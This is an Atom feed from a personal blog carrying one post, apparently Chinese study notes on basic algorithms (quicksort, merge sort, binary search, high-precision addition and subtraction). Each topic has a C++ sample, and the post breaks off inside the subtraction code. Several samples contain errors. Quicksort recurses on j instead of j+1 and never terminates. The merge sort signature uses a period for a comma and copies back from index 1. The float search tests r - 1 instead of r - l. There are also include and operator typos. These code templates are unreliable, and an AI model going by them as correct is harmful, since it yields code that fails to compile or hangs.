<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>【W】</title>
  
  
  <link href="https://0410wzn.top/atom.xml" rel="self"/>
  
  <link href="https://0410wzn.top/"/>
  <updated>2022-01-12T06:42:09.203Z</updated>
  <id>https://0410wzn.top/</id>
  
  <author>
    <name>W</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Acwing算法基础学习笔记</title>
    <link href="https://0410wzn.top/2022/01/10/Acwing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://0410wzn.top/2022/01/10/Acwing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-01-09T16:00:00.000Z</published>
    <updated>2022-01-12T06:42:09.203Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Acwing算法基础学习笔记"><a href="#Acwing算法基础学习笔记" class="headerlink" title="Acwing算法基础学习笔记"></a>Acwing算法基础学习笔记</h1><h2 id="1-基础算法"><a href="#1-基础算法" class="headerlink" title="1.基础算法"></a>1.基础算法</h2><h3 id="1、排序"><a href="#1、排序" class="headerlink" title="1、排序"></a>1、排序</h3><h4 id="1、快速排序"><a href="#1、快速排序" class="headerlink" title="1、快速排序"></a>1、快速排序</h4><p>分治            先分数再递归</p><p>(1) 确定分界点：q[ l ]左边界    q[ (l+r)/2 ]中间值    q[ r ]右边界    随机    </p><p>(2) <font color="red">调整区间：    使得第一个区间里的数小于等于x。第二个区间里的数大于等于x</font></p><p>(3) 递归： 递归左右两段</p><p>(2)的”暴力”做法    <font color="red">不推荐优先使用</font></p><p>一、还开两个额外的数组a和b</p><p>二、遍历 q[ l ~ r ] 当 q[ i ] &lt;= x，把x放进数组a；</p><p>​                                当 q[ i ] &gt;  x，把x放进数组b；</p><p>三、把a中的数放到q里，b里的数也放在群里</p><p>(2)的”优美”做法</p><p>使用两个指针，一个在左，一个在右，一起向中间走，当i遇到比x大的数时停下，当k遇到比x小及等于x的数时停下，</p><p>当两者都停下，并且指向各不满足条件的数时，使用swap函数交换其指向的值，交换后就继续执行动作，直到中间相遇位置，此时区间已经被一分为二</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211123235030846.png" alt="image-20211123235030846"></p><p>为什么”优美”？    ——在任意时刻左指针左面的数都小于等于x，右指针的右面的数都大于x；</p><p>样例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> q[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> q[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> x = q[l + r &gt;&gt; <span class="number">1</span>], i = l - <span class="number">1</span>, j = r + <span class="number">1</span>;<span class="comment">//由于我们的动作是先把指针向内移一  格，所以要开左右大一格的区间</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt; j)<span class="comment">//循环迭代</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">do</span> i ++; <span class="keyword">while</span> (q[i] &lt; x);</span><br><span class="line">        <span class="keyword">do</span> j --; <span class="keyword">while</span> (q[j] &gt; x);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; j)<span class="built_in">swap</span>(q[i],q[j]);<span class="comment">//没有swap函数，就设置一个中间变量转换</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//递归处理左右两段</span></span><br><span class="line">    <span class="built_in">quick_sort</span>(q, l, j);</span><br><span class="line">    <span class="built_in">quick_sort</span>(q, j, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">quick_sort</span>(q, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++ ) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、归并排序"><a href="#2、归并排序" class="headerlink" title="2、归并排序"></a>2、归并排序</h4><p>分治            先递归</p><p>(1) 确定分界点：mid = ( l + r ) / 2</p><p>(2) 递归排序左右两边</p><p>(3) <font color="red">归并 —— 合二为一(将两个有序的数组合成一个)</font>        </p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211125003853886.png" alt="image-20211125003853886"></p><p>两个排好序的数组，比较指针所指位置的数的大小，将小的值存入第三个数组，其指针后移，与另一个数列没动指针所指的数继续比较</p><p>时间复杂度</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211125004954526.png" alt="image-20211125004954526"></p><p>样例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1000010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> q[N],tmp[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge_sort</span><span class="params">(<span class="keyword">int</span> q[], <span class="keyword">int</span> l. <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;<span class="comment">//判断数是否够</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">merge_sort</span>(q, l ,mid), <span class="built_in">merge_sort</span>(q, mid+<span class="number">1</span>, r);<span class="comment">//分开排序</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>, i = l, j = mid + <span class="number">1</span>;<span class="comment">//归并</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)<span class="comment">//左右都没轮空</span></span><br><span class="line">        <span class="keyword">if</span> (q[i] &lt;= q[j])tmp[k++] = q[i++];</span><br><span class="line">    <span class="keyword">else</span> tmp[k ++] = q[j ++];</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid)tmp[k++] = q[i++];</span><br><span class="line">    <span class="keyword">while</span> (j &lt;= r)tmp[k++] = q[j ++];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= r; i ++, j ++) q[i] = tmp[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">merge_sort</span>(q, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="2、二分"><a href="#2、二分" class="headerlink" title="2、二分"></a>2、二分</h3><p><font color="red">有单调性一定可以二分，没有单调性也有可能二分</font></p><p><font color="red">保证答案在区间内部</font></p><h4 id="1、整数二分"><a href="#1、整数二分" class="headerlink" title="1、整数二分"></a>1、整数二分</h4><p>二分的本质：边界</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211125091422224.png" alt="image-20211125091422224"></p><p>模板</p><p>一、二分红色区域找到红色区间中间值 mid = (l + r) / 2，每次判断其是否满足红色区间划分的性质，再判断答案再那个区间内</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211125093910801.png" alt="image-20211125093910801"></p><p>二，绿色同理</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211125092806023.png" alt="image-20211125092806023"></p><p>如何选择用哪个模板？ —— 先写一个check函数，思考该如何更新区间，是l = mid还是r = mid。当l = mid时，补上+1(当l = r - 1时， 因为c++向下取整，循环会进入死胡同)，r = mid则不需。</p><p>样例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n,q;</span><br><span class="line"><span class="keyword">int</span> p[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;q);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;p[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (q --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;k);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r)            <span class="comment">//求左边界</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (p[mid] &gt;= k)  r = mid;</span><br><span class="line">            <span class="keyword">else</span> l = mid + <span class="number">1</span>;       <span class="comment">//不满足的话，mid是取不到的</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p[l] != k) cout &lt;&lt; <span class="string">&quot;-1 -1&quot;</span> &lt;&lt; endl;     <span class="comment">//左边界无的话，更别提右了</span></span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; l &lt;&lt; <span class="string">&#x27; &#x27;</span>;       <span class="comment">//先输出刚才求的左边界，防止被覆盖</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r)       <span class="comment">//求右边界</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> mid = l + r +&gt;&gt; <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (p[mid] &lt;= k) l = mid;</span><br><span class="line">                <span class="keyword">else</span> r = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cout &lt;&lt; l &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、浮点数二分"><a href="#2、浮点数二分" class="headerlink" title="2、浮点数二分"></a>2、浮点数二分</h4><p>大致思想差不多，不过由于没有整除，区间长度可以严格缩小一半，<font color="red">当区间长度足够小时，我们可以认为已经找到了答案</font></p><p>样例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iotream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> x;</span><br><span class="line">    cin &gt;&gt; x;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">double</span> l = <span class="number">0</span>, r = x;</span><br><span class="line">    <span class="keyword">while</span> (r - <span class="number">1</span> &gt; <span class="number">1e-6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">double</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (mid * mid &gt;= x) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lf\n&quot;</span>, l);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="3、高精度"><a href="#3、高精度" class="headerlink" title="3、高精度"></a>3、高精度</h3><p> 主要的四种类型</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208232110718.png" alt="image-20211208232110718"></p><p>C++没有大整数类，那C++是怎样存储一个大整数的呢？—— 1个int变量是存不下来的，实际上是把每一位存到数组（最好由高到低例如129，9存到第0位——方便计算时进位）里面去</p><p>运算 —— 模拟人工</p><h4 id="1、高精度加法"><a href="#1、高精度加法" class="headerlink" title="1、高精度加法"></a>1、高精度加法</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208233125816.png" alt="image-20211208233125816"></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C = A + B</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">add</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;A, vector&lt;<span class="keyword">int</span>&gt; &amp;B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; C;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || i &lt; B.<span class="built_in">size</span>(); i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>()) t += A[i];</span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) t += B[i];</span><br><span class="line">        C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);    <span class="comment">//写入低位</span></span><br><span class="line">        t /= <span class="number">10</span>;                <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (t)  C.<span class="built_in">push_back</span>(<span class="number">1</span>);     <span class="comment">//看最高位</span></span><br><span class="line">    <span class="keyword">return</span> C; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string a, b;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; A, B;</span><br><span class="line">    </span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;<span class="comment">// a = &quot;123456&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);<span class="comment">//A = [&#x27;6&#x27;...&#x27;1&#x27;]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> C = <span class="built_in">add</span>(A, B);     <span class="comment">//auto在声明变量时根据变量初始值的类型自动为变量匹配类型，代替冗长复杂的变auto量和使用范围专一的变量声明</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、高精度减法"><a href="#2、高精度减法" class="headerlink" title="2、高精度减法"></a>2、高精度减法</h4><p>计算思路<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209010325898.png" alt="image-20211209010325898"></p><p>比较大小，看正负<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209010413652.png" alt="image-20211209010413652"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;A, vector&lt;<span class="keyword">int</span>&gt; &amp;B)</span>    <span class="comment">//查看A是否大于等于B</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (A.<span class="built_in">size</span>() != B.<span class="built_in">size</span>()) <span class="keyword">return</span> A.<span class="built_in">size</span>() &gt; B.<span class="built_in">size</span>();<span class="comment">//位数不同，直接比大小</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --)<span class="comment">//从高位向低位一个一个比</span></span><br><span class="line">        <span class="keyword">if</span> (A[i] != B[i])   <span class="keyword">return</span> A[i] &gt; B[i];<span class="comment">//有不同，直接比</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//y</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C = A + B</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sub</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;A, vector&lt;<span class="keyword">int</span>&gt; &amp;B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; C;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, t = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        t = A[i] - t;         <span class="comment">//给t当前A的值</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) t -= B[i];     <span class="comment">//判断减数是否存在</span></span><br><span class="line">        C.<span class="built_in">push_back</span>((t + <span class="number">10</span>) % <span class="number">10</span>);      <span class="comment">//t是可能小于0的 </span></span><br><span class="line">        <span class="keyword">if</span> (t &lt; <span class="number">0</span>) t = <span class="number">1</span>;        <span class="comment">//查看高位的运算是否减一，即是否借位</span></span><br><span class="line">        <span class="keyword">else</span> t = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>)  <span class="comment">//留1位(此时这个数在数组的最高位)， 防止差刚好为0</span></span><br><span class="line">        C.<span class="built_in">pop_back</span>();                      <span class="comment">//back()函数返回末尾元素的引用，pop_back()则是删除  末尾元素——这里是前几位可能多出来的0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string a, b;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt;A, B;</span><br><span class="line">    </span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;   <span class="comment">// a = &quot;123456&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>); <span class="comment">//A = [&#x27;6&#x27;...&#x27;1&#x27;]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">cmp</span>(A, B))    <span class="comment">//判断A、B大小</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">auto</span> C = <span class="built_in">sub</span>(A, B);     <span class="comment">//在声明变量时根据变量初始值的类型自动为变量匹配类型，代替冗长复杂的 变量和使用范围专一的变量声明</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) <span class="built_in">printf</span>(<span 